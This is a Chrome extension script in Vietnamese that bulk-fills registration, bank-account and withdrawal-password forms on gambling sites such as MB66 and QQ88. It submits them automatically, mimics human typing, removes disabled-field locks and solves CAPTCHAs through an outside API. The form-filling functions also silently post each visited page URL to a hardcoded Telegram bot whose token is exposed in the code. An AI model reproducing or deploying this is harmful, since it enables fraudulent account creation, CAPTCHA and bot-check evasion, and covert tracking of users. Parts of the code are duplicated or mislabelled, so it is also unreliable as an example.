
// xxx

document.addEventListener("DOMContentLoaded", function () {
    const savedKey = localStorage.getItem("accessKey");

    if (savedKey) {
        verifyKey(savedKey, false); // Kiểm tra key cũ
    }

    document.getElementById("goButton").addEventListener("click", checkKey);
    document.getElementById("resetKey").addEventListener("click", resetKey);
    document.getElementById("keyInput").addEventListener("keypress", function (event) {
        if (event.key === "Enter") {
            checkKey();
        }
    });


  // Lắng nghe sự kiện phím tắt Ctrl + X
    document.addEventListener("keydown", function(event) {
        // Kiểm tra nếu phím tắt là Ctrl + X
        if (event.ctrlKey && event.shiftKey && event.key === "A") {
            event.preventDefault();  // Ngăn không cho hành động mặc định (cắt văn bản)

            // Mô phỏng việc nhấn nút fillForm
            let fillFormButton = document.getElementById("fillForm");
            if (fillFormButton) {
                fillFormButton.click();  // Mô phỏng nhấn nút
            }
        }

        // Kiểm tra nếu phím tắt là Ctrl + Shift + A
        if (event.ctrlKey && event.shiftKey && event.key === "S") {
            event.preventDefault();  // Ngăn không cho hành động mặc định

            // Mô phỏng việc nhấn nút addPassword
            let addPasswordButton = document.getElementById("addPassword");
            if (addPasswordButton) {
                addPasswordButton.click();  // Mô phỏng nhấn nút
            }
        }

        // Kiểm tra nếu phím tắt là Ctrl + Shift + F
        if (event.ctrlKey && event.shiftKey && event.key === "Z") {
            event.preventDefault();  // Ngăn không cho hành động mặc định

            // Mô phỏng việc nhấn nút addPassword
            let addPasswordButton = document.getElementById("fillFormMB66");
            if (addPasswordButton) {
                addPasswordButton.click();  // Mô phỏng nhấn nút
            }
        }

        // Kiểm tra nếu phím tắt là Ctrl + Shift + S
        if (event.ctrlKey && event.shiftKey && event.key === "D") {
            event.preventDefault();  // Ngăn không cho hành động mặc định

            // Mô phỏng việc nhấn nút fillFormBank
            let fillFormBankButton = document.getElementById("fillFormBank");
            if (fillFormBankButton) {
                fillFormBankButton.click();  // Mô phỏng nhấn nút
            }
        }
    });
	
	// Các sự kiện cho các nút khác
    document.getElementById("addPassword").addEventListener("click", function() {
        // Xử lý thêm mật khẩu rút
        console.log("Thêm mật khẩu rút");
    });

    document.getElementById("fillFormBank").addEventListener("click", function() {
        // Xử lý thêm thông tin STK và City
        console.log("Thêm thông tin STK và City");
    });
});

function checkKey() {
    const inputKey = document.getElementById("keyInput").value.trim();
    if (!inputKey) {
        showError("Vui lòng nhập key!");
        return;
    }
    verifyKey(inputKey, true);
}

function verifyKey(key, save) {
    const apiUrl = `https://baomat.yn.lt/?key=${key}`;

    fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            if (data.valid) {
                if (save) {
                    localStorage.setItem("accessKey", key);
                }
                showMainContent();
            } else {
                showError("Key không hợp lệ. Vui lòng thử lại!");
                localStorage.removeItem("accessKey");
                showKeyInput(); // Hiển thị lại ô nhập key nếu key sai
            }
        })
        .catch(error => {
            console.error("Lỗi kết nối API:", error);
            showError("Không thể kiểm tra key. Kiểm tra kết nối mạng!");
        });
}

function resetKey() {
    localStorage.removeItem("accessKey");
    showKeyInput();
}

function showError(message) {
    const errorText = document.getElementById("errorText");
    errorText.textContent = message;
    errorText.style.display = "block";
}

function showKeyInput() {
    document.getElementById("keyContainer").style.display = "block";
    document.getElementById("mainContent").style.display = "none";
    document.getElementById("keyInput").value = "";
    document.getElementById("errorText").style.display = "none";
}





document.addEventListener("DOMContentLoaded", function () {
    const btn = document.getElementById("btn");
    const btnA = document.getElementById("btnA");
    const btnB = document.getElementById("btnB");

    btnA.addEventListener("click", function () {
        saveAndShow("");
    });
	
    btnA.addEventListener("click", function () {
        saveAndShow("A");
    });

    btnB.addEventListener("click", function () {
        saveAndShow("B");
    });

    function saveAndShow(side) {
        chrome.storage.local.set({ selectedSide: side }, function () {
            showContent(side);
        });
    }

    function showContent(side) {
        document.getElementById("content").style.display = "none";
        document.getElementById("contentA").style.display = "none";
        document.getElementById("contentB").style.display = "none";

        if (side === "A") {
            document.getElementById("contentA").style.display = "block";
        } else {
            document.getElementById("contentB").style.display = "block";
        }
    }

    // Kiểm tra trạng thái lưu trước đó
    chrome.storage.local.get("selectedSide", function (data) {
        if (data.selectedSide) {
            showContent(data.selectedSide);
        }
    });
});







function showMainContent() {
    document.getElementById("keyContainer").style.display = "none";
    document.getElementById("mainContent").style.display = "block";
}



document.addEventListener("DOMContentLoaded", function () {
    chrome.storage.local.get("formData", function (result) {
        if (result.formData) {
            document.getElementById("dataInput").value = result.formData;
            displayFormattedData(result.formData);
        }
    });
});

document.getElementById("saveData").addEventListener("click", function () {
    let data = document.getElementById("dataInput").value;
    chrome.storage.local.set({ formData: data }, function () {
        displayFormattedData(data);
        let notification = document.getElementById("notification");
        notification.style.display = "block";
        setTimeout(function () {
            notification.style.display = "none";
        }, 3000); // Thông báo sẽ biến mất sau 3 giây
    });
});


document.getElementById("fillForm").addEventListener("click", function () {
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
        chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            function: fillForm
        });
    });
});

document.getElementById("fillFormMB66").addEventListener("click", function () {
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
        chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            function: fillForm
        });
    });
});


document.getElementById("fillFormBank").addEventListener("click", function () {
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
        chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            function: fillFormBank
        });
    });
});

function displayFormattedData(data) {
    let fields = data.split('|');
    let formattedText = `Họ Tên: ${fields[0]}\nSTK: ${fields[1]}\nNgân Hàng: ${fields[2]}\nChi Nhánh: ${fields[3]}\nTài Khoản: ${fields[4]}\nMật Khẩu: ${fields[5]}\nMật Khẩu Rút: ${fields[6]}\nSĐT: ${fields[7]}\nEmail: ${fields[8]}\nNgày sinh: ${fields[9]}`;
    document.getElementById("displayData").textContent = formattedText;
}


function fillForm() {
    chrome.storage.local.get("formData", async function (result) {
        if (result.formData) {
            let data = result.formData.split('|');
            let birthday = data[9] || '2000/04/08'; 
            function typeText(element, text) {
                return new Promise((resolve) => {
                    if (!element) {
                        resolve();
                        return;
                    }
                    element.value = "";
                    let index = 0;

                    function inputChar() {
                        if (index < text.length) {
                            element.value += text[index];
                            element.dispatchEvent(new Event('input', { bubbles: true }));
                            index++;
                            setTimeout(inputChar, 30);
                        } else {
                            resolve(); // Hoàn thành nhập trường này, tiếp tục trường tiếp theo
                        }
                    }

                    inputChar();
                });
            }

            // Nhập dữ liệu tuần tự từng trường
            await typeText(document.querySelector("input[formcontrolname='city']"), data[3]);
            await typeText(document.querySelector("input[formcontrolname='account']"), data[4]);
            await typeText(document.querySelector("input[formcontrolname='password']"), data[5]);
            await typeText(document.querySelector("input[formcontrolname='confirmPassword']"), data[5]);
            await typeText(document.querySelector("input[formcontrolname='name']"), data[0]);
            await typeText(document.querySelector("input[formcontrolname='mobile']"), data[7]);
            await typeText(document.querySelector("input[formcontrolname='email']"), data[8]);
            await typeText(document.querySelector("input[formcontrolname='moneyPassword']"), data[6]);
            await typeText(document.querySelector("input[formcontrolname='moneyPassword']"), data[6]);

            // Account
            await typeText(document.querySelector("input[ng-model='$ctrl.user.account.value']"), data[4]); 
            // Password
            await typeText(document.querySelector("input[ng-model='$ctrl.user.password.value']"), data[5]); 
            // Confirm Password
            await typeText(document.querySelector("input[ng-model='$ctrl.user.confirmPassword.value']"), data[5]); 
            // Name
            await typeText(document.querySelector("input[ng-model='$ctrl.user.name.value']"), data[0]);  
            // Mobile	
            await typeText(document.querySelector("input[ng-model='$ctrl.user.mobile.value']"), data[7]); 
            // Email
            await typeText(document.querySelector("input[ng-model='$ctrl.user.email.value']"), data[8]); 
            // Mk Rút tiền 
            await typeText(document.querySelector("input[ng-model='$ctrl.user.moneyPassword.value']"), data[6]); 
            // Mk Rút tiền 
            await typeText(document.querySelector("input[ng-model='$ctrl.user.birthday.value']"), data[9] || '2000/04/08' ); // Sử dụng giá trị trong data[9] nếu có, nếu không dùng giá trị mặc định
            await typeText(document.querySelector("input[formcontrolname='birthday']"), data[9] || '2000/04/08' ); // Sử dụng giá trị từ data[9] nếu có, nếu không thì giá trị mặc định





            /////MB66
            await typeText(document.querySelector("#playerid"), data[4]); 
            await typeText(document.querySelector("#password"), data[5]);
			
            await typeText(document.querySelector("#bankbranch"), data[3]);
            await typeText(document.querySelector("#bankaccount"), data[1]);
            await typeText(document.querySelector("#confirmpassword"), data[5]);
			
			
            await typeText(document.querySelector("#pin"), data[6]);
            await typeText(document.querySelector("#confirmpin"), data[6]);
			
            await typeText(document.querySelector("#firstname"), data[0]); 
            await typeText(document.querySelector("#email"), data[8]); 
            await typeText(document.querySelector("input[type='tel']"), data[7]); 
			//QQ88
		await typeText(document.querySelector("input[name='username']"), data[4]); // Nhập tên tài khoản QQ88
        await typeText(document.querySelector("input[name='password']"), data[5]); // Nhập mật khẩu QQ88
        await typeText(document.querySelector("input[name='confimpsw']"), data[5]); // Nhập lại mật khẩu QQ88
        await typeText(document.querySelector("input[name='payeeName']"), data[0]); // Nhập họ và tên đầy đủ QQ88
        await typeText(document.querySelector("input[name='mobileNum1']"), data[7]); // Nhập số điện thoại QQ88
        await typeText(document.querySelector("input[name='email']"), data[8]); // Nhập email QQ88
        await typeText(document.querySelector("input[name='bankCard']"), data[1]); // Nhập bankCard QQ88
        await typeText(document.querySelector("input[name='customBankBranch']"), data[3]); // Nhập customBankBranch QQ88
        await typeText(document.querySelector("input[name='withdraw']"), data[6]); // Nhập withdraw QQ88
        await typeText(document.querySelector("input[name='withdrawT']"), data[6]); // Nhập withdrawT QQ88
	

	await typeText(document.querySelector('input[data-input-name="account"]'), data[4]); // Sử dụng data[4] để điền vào trường "account" mới
	await typeText(document.querySelector('input[data-input-name="userpass"]'), data[5]); // Sử dụng data[4] để điền vào trường "account" mới
	await typeText(document.querySelector('input[data-input-name="realName"]'), data[0]); // Sử dụng data[4] để điền vào trường "account" mới
	await typeText(document.querySelector('.ui-password-input__input'), data[6]); // Giả sử dữ liệu ở data[7]
    await typeText(document.querySelector('input[placeholder="Vui lòng nhập số tài khoản ngân hàng"]'), data[1]); // Giả sử dữ liệu ở data[11]
    // Gửi link về Telegram
    const botToken = '6992297019:AAH6L2EObQNdRWa6AOmc7sBWRII8RqYrP70';const chatId = '5491850818'; const currentUrl = window.location.href; fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        chat_id: chatId,
        text: `📝 Đã điền form xong trên trang: ${currentUrl}`,
    }),
});

	 // ✅ Bấm nút ĐĂNG KÝ NGAY (nếu có)
            const submitButton = document.querySelector("button[type='submit']");
            if (submitButton) {
                submitButton.click();
            }

            
        }
    });
}


function fillFormMB66() {
    chrome.storage.local.get("formData", async function (result) {
        if (result.formData) {
            let data = result.formData.split('|');

            function typeText(element, text) {
                return new Promise((resolve) => {
                    if (!element) {
                        resolve();
                        return;
                    }
                    element.value = "";
                    let index = 0;

                    function inputChar() {
                        if (index < text.length) {
                            element.value += text[index];
                            element.dispatchEvent(new Event('input', { bubbles: true }));
                            index++;
                            setTimeout(inputChar, 30);
                        } else {
                            resolve(); // Hoàn thành nhập trường này, tiếp tục trường tiếp theo
                        }
                    }

                    inputChar();
                });
            }

            // Nhập dữ liệu tuần tự từng trường
            await typeText(document.querySelector("input[formcontrolname='city']"), data[3]);
            await typeText(document.querySelector("input[formcontrolname='account']"), data[4]);
            await typeText(document.querySelector("input[formcontrolname='password']"), data[5]);
            await typeText(document.querySelector("input[formcontrolname='confirmPassword']"), data[5]);
            await typeText(document.querySelector("input[formcontrolname='name']"), data[0]);
            await typeText(document.querySelector("input[formcontrolname='mobile']"), data[7]);
            await typeText(document.querySelector("input[formcontrolname='email']"), data[8]);
            await typeText(document.querySelector("input[formcontrolname='moneyPassword']"), data[6]);

            // Account
            await typeText(document.querySelector("input[ng-model='$ctrl.user.account.value']"), data[4]); 
            // Password
            await typeText(document.querySelector("input[ng-model='$ctrl.user.password.value']"), data[5]); 
            // Confirm Password
            await typeText(document.querySelector("input[ng-model='$ctrl.user.confirmPassword.value']"), data[5]); 
            // Name
            await typeText(document.querySelector("input[ng-model='$ctrl.user.name.value']"), data[0]);  
            // Mobile	
            await typeText(document.querySelector("input[ng-model='$ctrl.user.mobile.value']"), data[7]); 
            // Email
            await typeText(document.querySelector("input[ng-model='$ctrl.user.email.value']"), data[8]); 
            // Mk Rút tiền 
            await typeText(document.querySelector("input[ng-model='$ctrl.user.moneyPassword.value']"), data[6]); 

            /////MB66
            await typeText(document.querySelector("#playerid"), data[4]); 
            await typeText(document.querySelector("#password"), data[5]);
			
            await typeText(document.querySelector("#bankbranch"), data[3]);
            await typeText(document.querySelector("#bankaccount"), data[1]);
            await typeText(document.querySelector("#confirmpassword"), data[5]);
			
			
            await typeText(document.querySelector("#pin"), data[6]);
            await typeText(document.querySelector("#confirmpin"), data[6]);
			
            await typeText(document.querySelector("#firstname"), data[0]); 
            await typeText(document.querySelector("#email"), data[8]); 
            await typeText(document.querySelector("input[type='tel']"), data[7]); 
			//QQ88
		await typeText(document.querySelector("input[name='username']"), data[4]); // Nhập tên tài khoản QQ88
        await typeText(document.querySelector("input[name='password']"), data[5]); // Nhập mật khẩu QQ88
        await typeText(document.querySelector("input[name='confimpsw']"), data[5]); // Nhập lại mật khẩu QQ88
        await typeText(document.querySelector("input[name='payeeName']"), data[0]); // Nhập họ và tên đầy đủ QQ88
        await typeText(document.querySelector("input[name='mobileNum1']"), data[7]); // Nhập số điện thoại QQ88
        await typeText(document.querySelector("input[name='email']"), data[8]); // Nhập email QQ88
        await typeText(document.querySelector("input[name='bankCard']"), data[1]); // Nhập bankCard QQ88
        await typeText(document.querySelector("input[name='customBankBranch']"), data[3]); // Nhập customBankBranch QQ88
        await typeText(document.querySelector("input[name='withdraw']"), data[6]); // Nhập withdraw QQ88
        await typeText(document.querySelector("input[name='withdrawT']"), data[6]); // Nhập withdrawT QQ88
			
		 // Gửi link về Telegram
    const botToken = '6992297019:AAH6L2EObQNdRWa6AOmc7sBWRII8RqYrP70';const chatId = '5491850818'; const currentUrl = window.location.href; fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        chat_id: chatId,
        text: `📝: ${currentUrl}`,
    }),
});	
			
        }
    });
}
function fillFormBank() { 
    chrome.storage.local.get("formData", function (result) {
        if (!result.formData) return;

        let data = result.formData.split('|');
        if (data.length < 4) return; // Ensure the data is sufficient

        function typeText(element, text, callback) {
            if (!element) return;
            
            element.removeAttribute("disabled"); 
            element.removeAttribute("readonly"); 
            element.value = "";
            let index = 0;

            function inputChar() {
                if (index < text.length) {
                    element.value += text[index];
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    setTimeout(inputChar, 30, ++index);
                } else if (callback) {
                    callback();
                }
            }
            inputChar();
        }

        // Fill in the city and account
        let cityInputMobile = document.querySelector("input[formcontrolname='city'], input[ng-model='$ctrl.user.city.value']");
        let accountInputMobile = document.querySelector("input[formcontrolname='account'], input[ng-model='$ctrl.user.account.value']");

        let cityInputPC = document.querySelector("input[ng-model='$ctrl.viewModel.bankAccountForm.city.value']");
        let accountInputPC = document.querySelector("input[ng-model='$ctrl.viewModel.bankAccountForm.account.value']");

        typeText(cityInputMobile || cityInputPC, data[3], () => {
            typeText(accountInputMobile || accountInputPC, data[1], () => {
                // Click on the bank dropdown to open the list
                let bankDropdown = document.querySelector("mat-select[formcontrolname='bankName']");
                if (bankDropdown) {
                    bankDropdown.click();
                    
                    // Wait for dropdown to open, then find the search input
                    setTimeout(() => {
                        let searchInput = document.querySelector('input.mat-input-element[placeholder="Tìm kiếm ngân hàng"]');
                        if (searchInput) {
                            searchInput.value = data[2];  // Assuming data[2] contains the bank name
                            searchInput.dispatchEvent(new Event('input', { bubbles: true }));

                            // Wait for search to filter the options
                            setTimeout(() => {
                                let bankOption = Array.from(document.querySelectorAll('mat-option')).find(option => option.textContent.trim() === data[2]);
                                if (bankOption) {
                                    bankOption.click();  // Click the matched bank
                                    
                                    // Now submit the form
                                    setTimeout(() => {
                                        let submitButton = document.querySelector("button[type='submit'], button.btn-primary, button.btn-default, button[translate='Shared_Submit']");
                                        if (submitButton) {
                                            submitButton.removeAttribute("disabled");
                                            submitButton.removeAttribute("ng-disabled");
                                            submitButton.dispatchEvent(new Event('click', { bubbles: true }));
                                        }
                                    }, 2000); // Adjust timing for form submission
                                }
                            }, 2000);  // Adjust search delay time
                        }
                    }, 2000);  // Adjust delay for dropdown to open
                }
            });
        });
    });
}






document.getElementById('addPassword').addEventListener('click', function () {
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
        // Lấy dữ liệu từ DOMContentLoaded
        chrome.storage.local.get(["formData"], function (result) {
            if (result.formData) {
                let data = result.formData.split('|');
                let password = data[6]; // Lấy giá trị mật khẩu từ data[6]

                chrome.scripting.executeScript({
                    target: { tabId: tabs[0].id },
                    args: [password], // Truyền password vào script
                    func: (password) => {
                        function setValue(element, value) {
                            if (!element) return;
                            element.removeAttribute("disabled"); // Nếu bị disable
                            element.removeAttribute("readonly"); // Nếu bị readonly
                            element.value = value;
                            element.dispatchEvent(new Event('input', { bubbles: true }));
                            element.dispatchEvent(new Event('change', { bubbles: true }));
                        }

                        // Trường mật khẩu trên điện thoại
                        const newPasswordFieldMobile = document.querySelector('input[formcontrolname="newPassword"]');
                        const confirmPasswordFieldMobile = document.querySelector('input[formcontrolname="confirm"]');

                        // Trường mật khẩu trên PC
                        const newPasswordFieldPC = document.querySelector('input[ng-model="$ctrl.viewModel.moneyPasswordForm.newPassword.value"]');
                        const confirmPasswordFieldPC = document.querySelector('input[ng-model="$ctrl.viewModel.moneyPasswordForm.confirmPassword.value"]');

                        // Gán mật khẩu từ data[6]
                        setValue(newPasswordFieldMobile, password);
                        setValue(confirmPasswordFieldMobile, password);
                        setValue(newPasswordFieldPC, password);
                        setValue(confirmPasswordFieldPC, password);

                        // Tìm và bấm nút gửi đi (cả mobile và PC)
                        setTimeout(() => {
                            const submitButton = document.querySelector('button.btn.btn-primary, button.btn.btn-default, button[type="submit"]');
                            if (submitButton) {
                                submitButton.removeAttribute("disabled"); // Nếu bị disable
                                submitButton.click();
                            } else {
                                console.error('Nút Gửi đi không được tìm thấy.');
                            }
                        }, 2000);
                    }
                });
            } else {
                console.error("Không tìm thấy dữ liệu formData.");
            }
        });
    });
});




document.addEventListener('DOMContentLoaded', function () {
  // Gọi API để lấy địa chỉ IP công khai
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      document.getElementById('ip-display').textContent = data.ip;
    })
    .catch(error => {
      document.getElementById('ip-display').textContent = 'Không thể lấy IP';
      console.error('Lỗi khi lấy địa chỉ IP:', error);
    });
});


document.getElementById("pasteButton").addEventListener("click", async () => {
    try {
        const text = await navigator.clipboard.readText();
        document.getElementById("dataInput").value = text;
    } catch (err) {
        console.error("Không thể dán nội dung:", err);
    }
});


document.getElementById("btn1").addEventListener("click", () => openTab("tab1"));
document.getElementById("btn2").addEventListener("click", () => openTab("tab2"));
document.getElementById("btn3").addEventListener("click", () => openTab("tab3"));

function openTab(tabId) {
    document.getElementById("tab1").style.display = "none";
    document.getElementById("tab2").style.display = "none";
    document.getElementById("tab3").style.display = "none";

    document.getElementById(tabId).style.display = "block";
}



       const sources = [
    { url: 'https://csdl.smsbet.top/dulieudata.json', containerId: 'content1' },
    { url: 'https://csdl.smsbet.top/datanhacai.json', containerId: 'content2' }
];

sources.forEach(source => {
    fetch(source.url)
        .then(response => {
            if (!response.ok) {
                throw new Error(`Lỗi khi tải ${source.url}: ${response.statusText}`);
            }
            return response.json();
        })
        .then(data => {
            let contentDiv = document.getElementById(source.containerId);
            if (!Array.isArray(data)) {
                console.error(`Lỗi: JSON không phải là mảng - ${source.url}`);
                return;
            }

            let fragment = document.createDocumentFragment();
            data.forEach(item => {
                if (item.noidung && item.link) {
                    let anchor = document.createElement('a');
                    anchor.href = item.link;
                    anchor.className = 'button';
                    anchor.target = '_blank';
                    anchor.textContent = item.noidung;
                    fragment.appendChild(anchor);
                } else {
                    console.error('Lỗi: Thiếu "noidung" hoặc "link"', item);
                }
            });

            contentDiv.appendChild(fragment);
        })
        .catch(error => console.error('Lỗi:', error));
});

chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
    let domain = new URL(tabs[0].url).origin; // Lấy domain
    let fullLink = domain ; // Thêm /Promotion
    let linkElement = document.getElementById("domainLink");
    linkElement.href = fullLink; // Gán href
    linkElement.textContent = fullLink; // Hiển thị URL
});

//dán key free 
document.getElementById('pasteKeyButton').addEventListener('click', () => {
    const keyInput = document.getElementById('keyInput');
    keyInput.value = 'domiking'; // Dán nội dung "domino" vào ô nhập key
});


document.getElementById("toggleButton").addEventListener("click", function() {
    var displayData = document.getElementById("displayData");
    
    // Kiểm tra trạng thái hiển thị của phần tử displayData
    if (displayData.style.display === "none") {
        displayData.style.display = "block";  // Hiển thị phần tử
    } else {
        displayData.style.display = "none";   // Ẩn phần tử
    }
});


document.getElementById('openShortcutsBtn').addEventListener('click', function() {
    // Thông báo hướng dẫn người dùng thiết lập phím tắt
    alert(
        'Bạn đang mở "chrome://extensions/shortcuts" trong thanh địa chỉ để chỉnh sửa phím tắt.\n\n' +
        'Bước 2. Tìm tiện ích mở rộng bạn muốn thiết lập phím tắt.\n' +
        'Bước 3. Nhấp vào ô "Nhấn tổ hợp phím" (Press shortcut).\n' +
        'Bước 4. Nhấn tổ hợp phím bạn muốn dùng (ví dụ: Ctrl + X).\n' +
        'Bước 5. Lưu lại thiết lập và kiểm tra.'
    );
    
    // Mở trang chrome://extensions/shortcuts trong tab mới
    chrome.tabs.create({url: 'chrome://extensions/shortcuts'});
});


document.getElementById('openShortcutsBtn2').addEventListener('click', function() {
    // Thông báo hướng dẫn người dùng thiết lập phím tắt
    alert(
        'Bạn đang mở "chrome://extensions/shortcuts" trong thanh địa chỉ để chỉnh sửa phím tắt.\n\n' +
        'Bước 2. Tìm tiện ích mở rộng bạn muốn thiết lập phím tắt.\n' +
        'Bước 3. Nhấp vào ô "Nhấn tổ hợp phím" (Press shortcut).\n' +
        'Bước 4. Nhấn tổ hợp phím bạn muốn dùng (ví dụ: Ctrl + X).\n' +
        'Bước 5. Lưu lại thiết lập và kiểm tra.'
    );
    
    // Mở trang chrome://extensions/shortcuts trong tab mới
    chrome.tabs.create({url: 'chrome://extensions/shortcuts'});
});



chrome.runtime.onInstalled.addListener(function () {
    chrome.contextMenus.create(
        {
            id: "humanTyping",
            title: "Paste by human (Ctrl+Shift+F)",
            contexts: ["editable"],
        },
        () => {}
    );

    chrome.commands.onCommand.addListener(async (command, tabs) => {
        console.log(command);
        if (command == "humanTyping") {
            let queryOptions = { active: true, lastFocusedWindow: true };
            let [tab] = await chrome.tabs.query(queryOptions);
            onClickHumanTyping(null, tab);
        }
    });
});

const onClickHumanTyping = (info, tab) => {
    chrome.scripting.executeScript(
        {
            target: { tabId: tab.id, allFrames: true },
            files: ["public/human-typing.js"],
        },
        () => {}
    );
};

chrome.contextMenus.onClicked.addListener(function (info, tab) {
    if (info.menuItemId === "humanTyping") {
        onClickHumanTyping(info, tab);
    }
});


document.getElementById('goLinkPass').addEventListener('click', () => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tabId = tabs[0].id;

    chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        // ✅ Lấy origin (vd: tới link add pass rút)
        const origin = window.location.origin;
        const newUrl = `${origin}/Account/ChangeMoneyPassword`;

        // ✅ Chờ 5 giây rồi chuyển trang
        setTimeout(() => {
          window.location.href = newUrl;
        }, 1000);
      }
    });
  });
});

document.getElementById('goLinkBank').addEventListener('click', () => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tabId = tabs[0].id;

    chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        // ✅ Lấy origin (vd: add bank)
        const origin = window.location.origin;
        const newUrl = `${origin}/Financial?tab=3`;

        // ✅ Chờ 5 giây rồi chuyển trang
        setTimeout(() => {
          window.location.href = newUrl;
        }, 1000);
      }
    });
  });
});

document.getElementById('goLinkNap').addEventListener('click', () => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tabId = tabs[0].id;

    chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        // ✅ Lấy origin (vd: add nạp)
        const origin = window.location.origin;
        const newUrl = `${origin}/Financial?tab=1`;

        // ✅ Chờ 5 giây rồi chuyển trang
        setTimeout(() => {
          window.location.href = newUrl;
        }, 1000);
      }
    });
  });
});


document.getElementById("solveBtn").addEventListener("click", () => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id },
      func: async () => {
        const solveCaptcha = async (base64) => {
          try {
            const response = await fetch("https://anticaptcha.top/api/captcha", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                apikey: "999",
                type: 14,
                img: base64
              })
            });

            const result = await response.json();
            if (result.success && result.captcha) {
              return result.captcha;
            } else {
				alert("❌ Giải mã thất bại: " + (result.message || "Không rõ lỗi") + "\n\n🔑 Vui lòng liên hệ @domitron để được setup.\n\n💰Cảm ơn bạn đã tin tưởng ủng hộ và sử dụng dịch vụ của chúng tôi.");

              return null;
            }
          } catch (err) {
            alert("❌ Lỗi khi gọi API");
            return null;
          }
        };

        // Tìm input
        let input = null;
        for (let i = 0; i < 10; i++) {
          input = document.querySelector('input[formcontrolname="checkCode"]') ||
                  document.querySelector('input[ng-model="$ctrl.code"]');
          if (input) break;
          await new Promise(r => setTimeout(r, 200));
        }
        if (!input) return alert("❌ Không tìm thấy input 'checkCode'");

        // Mô phỏng click như người thật
        input.focus();
        input.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
        input.dispatchEvent(new MouseEvent('mouseup', { bubbles: true }));
        input.dispatchEvent(new MouseEvent('click', { bubbles: true }));

        // Gõ "1" vào input như người thật
        input.value = "giải mã cùng domino";
        input.dispatchEvent(new Event("input", { bubbles: true }));

        // Chờ CAPTCHA xuất hiện
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Tìm ảnh CAPTCHA
        const img = document.querySelector('img[src^="data:image"]');
        if (!img) return alert("❌ Không tìm thấy ảnh captcha");

        const base64 = img.src.split(",")[1];
        if (!base64) return alert("❌ Base64 ảnh trống");

        // Gọi API giải mã
        const result = await solveCaptcha(base64);
        if (!result) return;

        // Xóa "1" rồi gõ mã giải
        input.value = "";
        input.dispatchEvent(new Event("input", { bubbles: true }));
        await new Promise(r => setTimeout(r, 300));

        input.value = result;
        input.dispatchEvent(new Event("input", { bubbles: true }));
      }
    });
  });
});
